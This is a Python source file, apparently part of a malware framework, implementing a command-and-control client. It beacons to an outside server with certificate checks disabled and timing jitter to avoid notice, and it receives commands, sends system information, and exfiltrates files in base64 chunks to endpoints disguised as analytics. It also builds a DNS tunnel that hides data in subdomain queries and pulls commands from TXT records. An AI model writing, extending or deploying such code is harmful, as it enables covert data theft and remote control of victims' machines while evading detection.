# Enhanced C2 Communication Module
# Implements secure, stealthy command and control communications

import requests
import json
import time
import random
import base64
import urllib3
from urllib3.exceptions import InsecureRequestWarning
from config import (
    C2_SERVER, C2_USER_AGENT, C2_TIMEOUT, C2_MAX_RETRIES,
    RETRY_DELAY_MIN, RETRY_DELAY_MAX, DEBUG_MODE
)
from core.stealth import stealth_manager

# Disable SSL warnings for stealth operations
urllib3.disable_warnings(InsecureRequestWarning)

class SecureC2Client:
    
    def __init__(self, server_url=None, user_agent=None):
        self.server_url = server_url or C2_SERVER
        self.user_agent = user_agent or C2_USER_AGENT
        self.session = self._create_session()
        self.encryption_key = self._generate_session_key()
        
    def _create_session(self):
        session = requests.Session()
        
        session.verify = False
        
        session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        return session
    
    def _generate_session_key(self):
        import hashlib
        import uuid
        
        key_material = f"{uuid.getnode()}{time.time()}"
        return hashlib.md5(key_material.encode()).hexdigest()[:16]
    
    def _encrypt_data(self, data):
        if isinstance(data, dict):
            data = json.dumps(data)
        
        encrypted = ""
        key_len = len(self.encryption_key)
        
        for i, char in enumerate(data):
            encrypted += chr(ord(char) ^ ord(self.encryption_key[i % key_len]))
        
        return base64.b64encode(encrypted.encode()).decode()
    
    def _decrypt_data(self, encrypted_data):
        try:
            decoded = base64.b64decode(encrypted_data).decode()
            decrypted = ""
            key_len = len(self.encryption_key)
            
            for i, char in enumerate(decoded):
                decrypted += chr(ord(char) ^ ord(self.encryption_key[i % key_len]))
            
            return json.loads(decrypted)
        except Exception:
            return None
    
    def send_data(self, data, endpoint="/data", encrypt=True):
        if encrypt:
            payload = {
                'encrypted': True,
                'data': self._encrypt_data(data)
            }
        else:
            payload = {
                'encrypted': False,
                'data': data
            }
        
        for attempt in range(C2_MAX_RETRIES):
            try:
                # Jitter 
                stealth_manager.add_jitter()
                
                response = self.session.post(
                    f"{self.server_url}{endpoint}",
                    json=payload,
                    timeout=C2_TIMEOUT
                )
                
                if response.status_code == 200:
                    return self._handle_response(response)
                elif response.status_code == 404:
                    return self._try_alternative_endpoints(payload)
                    
            except requests.exceptions.RequestException as e:
                if DEBUG_MODE:
                    stealth_manager.safe_execute(
                        lambda: print(f"C2 communication attempt {attempt + 1} failed: {e}")
                    )
                
                if attempt < C2_MAX_RETRIES - 1:
                    delay = random.uniform(
                        RETRY_DELAY_MIN * (2 ** attempt),
                        RETRY_DELAY_MAX * (2 ** attempt)
                    )
                    time.sleep(delay)
        
        return False
    
    def _handle_response(self, response):
        try:
            response_data = response.json()
            
            if response_data.get('encrypted'):
                decrypted = self._decrypt_data(response_data.get('data', ''))
                return decrypted
            else:
                return response_data.get('data')
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Response handling failed: {e}")
                )
            return None
    
    def _try_alternative_endpoints(self, payload):
        alternative_endpoints = [
            "/api/upload",
            "/submit",
            "/log",
            "/analytics",
            "/metrics"
        ]
        
        for endpoint in alternative_endpoints:
            try:
                stealth_manager.add_jitter(0.5, 2)
                
                response = self.session.post(
                    f"{self.server_url}{endpoint}",
                    json=payload,
                    timeout=C2_TIMEOUT
                )
                
                if response.status_code == 200:
                    return self._handle_response(response)
                    
            except Exception:
                continue
        
        return False
    
    def receive_commands(self, endpoint="/commands"):
        try:
            stealth_manager.add_jitter()
            
            response = self.session.get(
                f"{self.server_url}{endpoint}",
                timeout=C2_TIMEOUT
            )
            
            if response.status_code == 200:
                return self._handle_response(response)
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Command retrieval failed: {e}")
                )
        
        return None
    
    def heartbeat(self, system_info=None):
        heartbeat_data = {
            'type': 'heartbeat',
            'timestamp': time.time(),
            'system_info': system_info or {}
        }
        
        return self.send_data(heartbeat_data, endpoint="/heartbeat")
    
    def exfiltrate_file(self, file_path, chunk_size=1024*1024):
        try:
            import os
            
            if not os.path.exists(file_path):
                return False
            
            file_size = os.path.getsize(file_path)
            file_name = os.path.basename(file_path)
            
            metadata = {
                'type': 'file_start',
                'filename': file_name,
                'size': file_size,
                'chunks': (file_size // chunk_size) + 1
            }
            
            if not self.send_data(metadata, endpoint="/upload"):
                return False
            
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    
                    chunk_data = {
                        'type': 'file_chunk',
                        'filename': file_name,
                        'chunk_num': chunk_num,
                        'data': base64.b64encode(chunk).decode()
                    }
                    
                    if not self.send_data(chunk_data, endpoint="/upload"):
                        return False
                    
                    chunk_num += 1
                    
                    # Add delay between chunks
                    stealth_manager.add_jitter(0.1, 1)
            
            # Send completion signal
            completion = {
                'type': 'file_complete',
                'filename': file_name
            }
            
            return self.send_data(completion, endpoint="/upload")
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"File exfiltration failed: {e}")
                )
            return False

class DNSC2Client:
    """DNS-based C2 communication for covert channels"""
    
    def __init__(self, domain="example.com"):
        self.domain = domain
        try:
            import dns.resolver
            self.resolver = dns.resolver.Resolver()
        except ImportError:
            self.resolver = None
    
    def send_data_dns(self, data):
        if not self.resolver:
            return False
            
        try:
            encoded_data = base64.b64encode(json.dumps(data).encode()).decode()
            chunks = [encoded_data[i:i+60] for i in range(0, len(encoded_data), 60)]
            
            for i, chunk in enumerate(chunks):
                subdomain = f"{i}.{chunk}.{self.domain}"
                try:
                    self.resolver.resolve(subdomain, 'TXT')
                except:
                    pass  # Expected to fail, we're just sending data
                
                stealth_manager.add_jitter(0.1, 0.5)
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"DNS C2 send failed: {e}")
                )
            return False
    
    def receive_commands_dns(self):
        if not self.resolver:
            return None
            
        try:
            command_domain = f"cmd.{self.domain}"
            answers = self.resolver.resolve(command_domain, 'TXT')
            
            for answer in answers:
                command_data = answer.to_text().strip('"')
                decoded_command = base64.b64decode(command_data).decode()
                return json.loads(decoded_command)
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"DNS C2 receive failed: {e}")
                )
        
        return None

c2_client = SecureC2Client()
dns_c2_client = DNSC2Client()